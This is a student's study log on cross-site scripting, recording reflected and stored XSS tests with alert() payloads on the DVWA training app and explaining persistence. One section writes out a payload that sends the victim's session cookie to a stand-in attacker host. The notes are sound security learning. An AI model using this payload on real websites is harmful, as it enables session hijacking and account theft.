# Month 2 - Week 1 Day 4: Cross-Site Scripting (XSS)

## What is XSS
XSS happens when an attacker injects malicious JavaScript into a web page, and that code runs in another user's browser instead of attacking the server or database directly.

## Types of XSS
- Reflected XSS: the script is part of the request/URL and gets echoed back immediately in the response. Not saved anywhere - only affects someone who clicks a specific malicious link.
- Stored XSS: the script gets permanently saved on the server (comment, guestbook, profile bio) and executes automatically for every visitor who views that page afterward.
- DOM-based XSS: the vulnerability exists purely in client-side JavaScript, without the malicious data ever touching the server.

## Step 1: Reflected XSS Test (DVWA)
Location: XSS (Reflected) page
Normal input: Mark -> returned "Hello Mark"
Injected payload: <script>alert('XSS')</script>
Result: An alert box popped up immediately after submitting, proving the script executed as real code instead of being displayed as plain text.

## Step 2: Stored XSS Test (DVWA)
Location: XSS (Stored) - Guestbook page
Normal input: Name: mark, Message: testing the guestbook -> saved normally and displayed
Injected payload (in Message field): <script>alert('Stored XSS Test')</script>
Result: Alert popped up immediately on submission.

## Step 3: The Critical Discovery - Persistence
Action: Refreshed the page (F5) without typing or submitting anything new.
Result: The alert popped up AGAIN, automatically, just from loading the page.
Why this matters: This proves the script is now permanently stored in the database and will execute for EVERY visitor who loads this page, not just the person who submitted it.

## Reflected vs Stored - Key Difference
- Reflected XSS: requires the victim to click a specific malicious link crafted by the attacker. One click, one victim.
- Stored XSS: attacks every single visitor automatically, with no action needed from them, for as long as the malicious entry remains in the database.

## What a Real Attacker Would Actually Do
Instead of alert('XSS'), a real attacker would use something like:
<script>document.location='http://attacker-server.com/steal?cookie='+document.cookie</script>
This would silently steal a victim's session cookie and send it to the attacker, allowing them to hijack the victim's logged-in session without knowing their password.

## What I Learned Today
Today SQL injection began to make sense after series of explanation, so after this session i learnt a whole lot like for example, is that the primary diffrence between reflected XSS and stored XSS is PERSISTENCE: Stored XSS permanently saves the malicious script on the target server (such as in a database or forum post), whereas Reflected XSS is temporary and not saved on the server
